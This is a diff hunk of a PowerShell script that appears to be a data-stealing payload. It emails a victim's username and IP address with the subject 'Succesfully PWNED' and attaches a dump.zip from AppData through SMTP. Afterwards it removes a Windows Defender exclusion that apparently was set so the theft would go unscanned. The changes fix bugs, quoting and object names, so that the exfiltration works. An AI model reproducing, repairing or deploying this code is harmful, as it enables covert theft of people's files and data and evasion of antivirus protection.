@@ -22,10 +22,10 @@ $ReportEmail.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
 $ReportEmail.Body = 'Opening web.'
 $files=Get-ChildItem 
-$ReportEmail.Attachments.Add('$env:appdata\Microsoft\dump\dump.zip')
+$ReportEmail.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
 $SMTPInfo.Send($ReportEmail)
-$Message.Dispose()
-$smtp.Dispose()
+$ReportEmail.Dispose()
+$SMTPInfo.Dispose()
 #Cleanup
-cd "env:appdata"
+cd "$env:appdata"
 Remove-MpPreference -ExclusionPath "$env:appdata"
